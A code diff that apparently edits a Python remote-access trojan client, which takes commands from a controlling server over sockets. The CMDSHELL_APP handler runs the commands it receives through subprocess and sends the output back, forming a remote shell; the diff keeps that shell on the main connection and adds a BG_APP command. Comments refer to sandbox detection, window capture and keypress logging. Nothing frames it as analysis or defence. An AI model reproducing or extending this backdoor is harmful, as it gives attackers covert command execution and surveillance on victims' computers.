@@ -14,21 +14,6 @@ import threading
 # import win32api
 import inspect
 import ctypes
-def _async_raise(tid, exctype):
-  """raises the exception, performs cleanup if needed"""
-  tid = ctypes.c_long(tid)
-  if not inspect.isclass(exctype):
-    exctype = type(exctype)
-  res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
-  if res == 0:
-    raise ValueError("invalid thread id")
-  elif res != 1:
-    # """if it returns a number greater than one, you're in trouble,
-    # and you should call it again with exc=NULL to revert the effect"""
-    ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
-    raise SystemError("PyThreadState_SetAsyncExc failed")
-def stop_thread(thread):
-  _async_raise(thread.ident, SystemExit)
 # import win32gui
 # import win32ui
 # def handler(ip, port):
@@ -64,14 +49,17 @@ def PINGPONG_client_T(ip, port):
                 for usage in usage_list:
                     s.send(bytes(usage, 'utf8'))
                     s.recv(1024)
-            if data.decode() == "EXIT_APP":
+            elif data.decode() == 'BG_APP':
+                s.send(bytes('OK', 'utf8'))
+                s.recv(1024)
+            elif data.decode() == "EXIT_APP":
                 s.close()
                 break
             elif data.decode() == "CHECK_APP":
                 s.send(bytes("OK", "utf8"))
 #cmd_START_location
             elif data.decode() == "CMDSHELL_APP":
-                def CMD_client(ip, port, main_port):
+                def CMD_client(ip, port, s):
                     from subprocess import Popen, PIPE
                     try:
                         try:
@@ -82,8 +70,8 @@ def PINGPONG_client_T(ip, port):
                         while True:
                             cmd_command = cmd_c.recv(1024)
                             if cmd_command.decode("utf8") == "exit" or cmd_command.decode("utf8") == "EXIT":
-                                main_port = cmd_c.recv(1024).decode("utf8")
-                                PINGPONG_client(ip, int(main_port))
+                                cmd_c.close()
+                                s.send(b'BACK')
                                 break
                             elif cmd_command.decode("utf8") == "PING":
                                 cmd_c.send(bytes("PONG", "utf8"))
@@ -96,14 +84,12 @@ def PINGPONG_client_T(ip, port):
                                 if not cmd_print_out:
                                     cmd_print_out = b'OK'
                                 cmd_c.send(cmd_print_out)
-                        cmd_c.close()
                     except:
                         sys.exit(1)
                 s.send(bytes("OK", 'utf8'))
                 cmd_port = int(s.recv(1024).decode(encoding="utf8"))
-                s.close()
-                CMD_client(ip, cmd_port, port)
-                break
+                s.send(b'OK')
+                CMD_client(ip, cmd_port, s)
 #cmd_END_location
 #priv_vbp_listen_START_location
             elif data.decode() == "PRO_VBP_APP":
@@ -264,6 +250,21 @@ def PINGPONG_client_T(ip, port):
         s.close()
     except:
         sys.exit(1)
+def _async_raise(tid, exctype):
+  """raises the exception, performs cleanup if needed"""
+  tid = ctypes.c_long(tid)
+  if not inspect.isclass(exctype):
+    exctype = type(exctype)
+  res = ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, ctypes.py_object(exctype))
+  if res == 0:
+    raise ValueError("invalid thread id")
+  elif res != 1:
+    # """if it returns a number greater than one, you're in trouble,
+    # and you should call it again with exc=NULL to revert the effect"""
+    ctypes.pythonapi.PyThreadState_SetAsyncExc(tid, None)
+    raise SystemError("PyThreadState_SetAsyncExc failed")
+def stop_thread(thread):
+  _async_raise(thread.ident, SystemExit)
 #exit_END_location
 
 # 沙箱检测
@@ -339,4 +340,3 @@ def PINGPONG_client_T(ip, port):
 #                 previous_timestamp = keypress_time
 #             elif keypress_time is not None:
 #                 previous_timestamp = keypress_time
-# PINGPONG_client("127.0.0.1", 624)
